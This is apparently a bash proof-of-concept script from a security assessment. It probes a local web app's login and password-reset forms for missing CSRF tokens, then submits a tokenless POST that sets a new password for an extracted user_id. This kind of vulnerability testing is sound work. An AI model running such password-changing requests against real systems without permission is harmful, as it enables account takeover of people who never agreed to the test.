#!/bin/bash

# POC: Missing CSRF Protection on Login Forms
# This script demonstrates that login forms lack CSRF tokens

TARGET="http://localhost:8082"
echo "[*] CSRF Protection Analysis on Login Forms"
echo "[*] Target: $TARGET"
echo ""

# Step 1: Check the main login form
echo "[Step 1] Analyzing main login form at /"
echo "============================================"
response=$(curl -s "$TARGET/")
echo "Response HTML (searching for CSRF/nonce/token fields):"
echo "$response" | grep -i "csrf\|nonce\|token\|authenticity" || echo "No CSRF tokens found in main login form"
echo ""

# Step 2: Check for hidden fields that might contain tokens
echo "[Step 2] Checking for any hidden input fields in login form"
echo "============================================"
hidden_fields=$(echo "$response" | grep -o '<input[^>]*type="hidden"[^>]*>' || echo "")
if [ -z "$hidden_fields" ]; then
    echo "No hidden input fields found (where CSRF tokens would typically be)"
else
    echo "Hidden fields found:"
    echo "$hidden_fields"
fi
echo ""

# Step 3: Check password reset form
echo "[Step 3] Analyzing password reset form at /password/test"
echo "============================================"
password_response=$(curl -s "$TARGET/password/test")
echo "Response HTML (searching for CSRF/nonce/token fields):"
echo "$password_response" | grep -i "csrf\|nonce\|token\|authenticity" || echo "No CSRF tokens found in password reset form"
echo ""

# Step 4: Check for hidden fields in password form
echo "[Step 4] Checking for hidden input fields in password form"
echo "============================================"
password_hidden=$(echo "$password_response" | grep -o '<input[^>]*type="hidden"[^>]*>' || echo "")
if [ -z "$password_hidden" ]; then
    echo "No hidden input fields found in password form"
else
    echo "Hidden fields found in password form:"
    echo "$password_hidden"
fi
echo ""

# Step 5: Demonstrate that forms accept requests without CSRF tokens
echo "[Step 5] Testing form submission WITHOUT CSRF token"
echo "============================================"
# Extract form data from password form
form_action=$(echo "$password_response" | grep -o 'action="[^"]*"' | head -1 | cut -d'"' -f2)
echo "Password form action: $form_action"

# Attempt to submit password reset form without CSRF token (using extracted user_id)
user_id=$(echo "$password_response" | grep -o 'name="user_id"[^>]*value="[^"]*"' | head -1 | cut -d'"' -f4)
echo "Extracted user_id: $user_id"
echo ""

# Try submitting form without CSRF token
echo "Submitting password form without CSRF token..."
submit_response=$(curl -s -X POST "$TARGET/password/test" \
  -d "user_id=$user_id&new_password=testpass123" \
  -w "\nHTTP_STATUS:%{http_code}")

http_status=$(echo "$submit_response" | grep "HTTP_STATUS" | cut -d':' -f2)
body=$(echo "$submit_response" | sed '$d')

echo "Response Status: $http_status"
if [ "$http_status" == "200" ] || [ "$http_status" == "302" ]; then
    echo "✓ Form accepted request WITHOUT CSRF token!"
    echo "✓ This confirms CSRF protection is missing"
else
    echo "Response: $body"
fi
echo ""

echo "[*] VULNERABILITY CONFIRMED:"
echo "    - Login forms lack CSRF tokens"
echo "    - Forms accept requests without token validation"
echo "    - No nonce, state, or authenticity parameters present"